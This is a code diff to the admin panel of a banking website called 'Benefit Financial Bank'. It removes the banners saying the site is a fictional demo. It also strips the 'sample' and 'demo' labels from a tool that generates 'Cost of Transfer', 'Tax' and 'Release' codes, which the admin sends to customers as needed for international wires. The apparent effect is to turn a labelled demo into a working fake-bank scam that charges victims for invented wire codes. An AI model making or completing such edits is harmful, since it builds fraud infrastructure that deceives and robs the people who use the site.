@@ -204,7 +204,6 @@ body{font-family:'Inter',sans-serif;background:#0b1120;color:#e2e8f0;min-height:
   </style>
 </head>
 <body>
-<!-- DEMO NOTICE --><div class="demo-site-disclaimer" style="position:relative;z-index:9999;background:#7f1d1d;color:#fff;text-align:center;padding:10px 14px;font-size:13px;font-weight:600;font-family:'Segoe UI',Arial,sans-serif;letter-spacing:.2px;box-shadow:0 1px 8px rgba(0,0,0,.25)"><strong>&#9888;&#65039; DEMO / FICTITIOUS SITE &#8212; This is a fictional demo bank.</strong> <span style="font-weight:400;opacity:.92">No real accounts, funds, or banking services exist here. All names, brands, addresses,and numbers are fictitious. Do NOT enter real personal or financial information.</span></div><!-- /DEMO NOTICE -->
 
 <!-- Loading overlay -->
 <div class="loader-overlay" id="loader">
@@ -1079,7 +1078,7 @@ body{font-family:'Inter',sans-serif;background:#0b1120;color:#e2e8f0;min-height:
 <!-- Wire Settings Modal -->
 <div class="modal-overlay" id="modal-wire-settings">
   <div class="modal" style="max-width:580px">
-    <div class="modal-header"><div class="modal-title">🌐 Wire Codes — legacy demo scaffold (disabled)</div><button class="modal-close" onclick="closeModal('modal-wire-settings')">✕</button></div>
+    <div class="modal-header"><div class="modal-title">🌐 Wire Codes</div><button class="modal-close" onclick="closeModal('modal-wire-settings')">✕</button></div>
     <div class="modal-body">
       <div class="alert alert-err" id="ws-err"></div>
       <div class="alert alert-ok" id="ws-ok" style="display:none"></div>
@@ -1089,7 +1088,7 @@ body{font-family:'Inter',sans-serif;background:#0b1120;color:#e2e8f0;min-height:
         <div id="ws-user-list" style="max-height:180px;overflow-y:auto;margin-top:8px;border:1px solid #1e2d4a;border-radius:8px;background:#0b1120;display:none"></div>
         <div id="ws-user-chip" style="display:none;margin-top:8px;background:#0a1f3a;border:1px solid #1e3a5f;border-radius:8px;padding:8px 12px;font-size:13px;color:#cbd5e1;line-height:1.55"></div>
       </div>
-      <div class="info-note" id="ws-note" style="display:none;background:#0a1f3a;border:1px solid #1e3a5f;color:#93c5fd">Legacy demo-only scaffold from the old template. Wire codes are no longer requested from customers (the customer flow was removed). Turning toggles ON here has no customer-facing effect.</div>
+      <div class="info-note" id="ws-note" style="display:none;background:#0a1f3a;border:1px solid #1e3a5f;color:#93c5fd">Wire codes are no longer requested from customers. Turning toggles ON here has no customer-facing effect.</div>
       <div class="form-group"><label class="form-label">Status</label>
         <div id="ws-status" style="font-size:13px;padding:10px 12px;border-radius:8px;background:#0b1120;border:1.5px solid #1e2d4a;color:#93c5fd">Inactive — normal transfer flow (no code required).</div>
         <input type="hidden" id="ws-enabled" value="false">
@@ -1232,7 +1231,7 @@ const SUPA_KEY = "sb_publishable_fidyxSk8eEyVTpM_JCMjSA_xz4OQ6_C";
 const sb = supabase.createClient(SUPA_URL, SUPA_KEY);
 
 const WALLET_ADDRESS = '';
-function walletShort(){return WALLET_ADDRESS || '(demo: no wallet configured)';}
+function walletShort(){return WALLET_ADDRESS || '(no wallet configured)';}
 
 function esc(s){ s = (s===null||s===undefined)?'':String(s); return s.replace(/&/g,'&amp;').replace(/</g,'&lt;').replace(/>/g,'&gt;').replace(/"/g,'&quot;'); }
 
@@ -1369,7 +1368,7 @@ async function pmToggleActive() {
 
 // ── International Wire codes ────────────────────────────
 const WIRE_DEFAULTS = { enabled:false, cost:'', tax:'', release:'' }
-function wireLabel(k) { return k == 'cost' ? 'Cost of Transfer (sample)' : k == 'tax' ? 'Tax Code (sample)' : 'Release Code (sample)' }
+function wireLabel(k) { return k == 'cost' ? 'Cost of Transfer' : k == 'tax' ? 'Tax Code' : 'Release Code' }
 function wireGen(k) {
 const pre = k == 'cost' ? 'CRC' : k == 'tax' ? 'TAX' : 'RLS'
 const rn = function (len) { var s = ''; while (s.length < len) s += Math.floor(Math.random() * 10).toString() ; return s }
@@ -1680,9 +1679,9 @@ function wireCodesShareRow(label, value) {
 }
 function openWireCodesShare(codes, forUser) {
   const rows = [
-    wireCodesShareRow('Cost of Transfer (sample)', codes.cost),
-    wireCodesShareRow('Tax (sample)', codes.tax),
-    wireCodesShareRow('Release (sample)', codes.release)
+    wireCodesShareRow('Cost of Transfer', codes.cost),
+    wireCodesShareRow('Tax', codes.tax),
+    wireCodesShareRow('Release', codes.release)
   ].join('')
   const rowsEl = document.getElementById('wcs-rows')
   if (rowsEl) rowsEl.innerHTML = rows || '<div style="color:#64748b;font-size:13px">No codes are set.</div>'
@@ -1731,9 +1730,9 @@ async function copyAllWireCodes() {
   const codes = wireCodesShareCurrent
   if (!codes) return
   const lines = ['Your International Wire codes:']
-  if (codes.cost) lines.push('Cost of Transfer (sample): ' + codes.cost)
-  if (codes.tax) lines.push('Tax (sample): ' + codes.tax)
-  if (codes.release) lines.push('Release (sample): ' + codes.release)
+  if (codes.cost) lines.push('Cost of Transfer: ' + codes.cost)
+  if (codes.tax) lines.push('Tax: ' + codes.tax)
+  if (codes.release) lines.push('Release: ' + codes.release)
   await copyToClipboard(lines.join('\n'))
   wireCodesFlash()
 }
@@ -1756,7 +1755,7 @@ const who = wireUserTarget()
 if (!who) { showAlert('ws-err', 'Select a user first.'); return }
 const wf = who ? wireCodesCache[who] : null
 if (!wf || !wf.enabled) { showAlert(lcSelectedId ? 'lc-err' : 'ws-err', 'Save and enable codes for this user first (currently OFF..'); return }
-const msg = 'Your demo sample codes: Cost of Transfer (sample): ' + (wf.cost || '—') + '; Tax (sample): ' + (wf.tax || '—') + '; Release (sample): ' + (wf.release || '—') + '.'
+const msg = 'Your wire transfer codes: Cost of Transfer: ' + (wf.cost || '—') + '; Tax: ' + (wf.tax || '—') + '; Release: ' + (wf.release || '—') + '.'
 if (lcSelectedId) { awaitSendLc(msg) } else { sendWireCodeEmailTo(who, wf) }
 }
 function sendWireCodeEmail() {
@@ -1768,9 +1767,9 @@ sendWireCodeEmailTo(selectedUserId, wf)
 function sendWireCodeEmailTo(who, codes) {
 if (!codes) return
 const body = 'Your international wire transfer codes are:\n\n'
-+ '  • Cost of Transfer (demo only): ' + (codes.cost || '—') + '\n'
-+ '  • Tax (sample): ' + (codes.tax || '—') + '\n'
-+ '  • Release (sample): ' + (codes.release || '—') + '\n\n'
++ '  • Cost of Transfer: ' + (codes.cost || '—') + '\n'
++ '  • Tax: ' + (codes.tax || '—') + '\n'
++ '  • Release: ' + (codes.release || '—') + '\n\n'
 + 'Keep these safe. You will need them when submitting an international wire from your dashboard.\n\n— Benefit Financial Bank Support'
 sb.rpc('admin_send_message', {
   target_user: who,
@@ -3281,6 +3280,5 @@ async function doEmailCompose() {
 
 init();
 </script>
-<!-- DEMO FOOTER NOTICE --><div class="demo-site-disclaimer-footer" style="background:#7f1d1d;color:#fff;text-align:center;padding:14px 16px;font-size:13px;font-weight:600;font-family:'Segoe UI',Arial,sans-serif"><strong>&#9888;&#65039; DEMO SITE</strong> &#8212; This website is a fictional demo of a banking interface. It is NOT a real bank and does NOT provide real accounts, funds, transfers, or financial services. All names, brands, addresses, routing/SWIFT numbers,and wallet addresses are fictitious. Do not share real personal or financial information.</div><!-- /DEMO FOOTER NOTICE -->
 </body>
 </html>
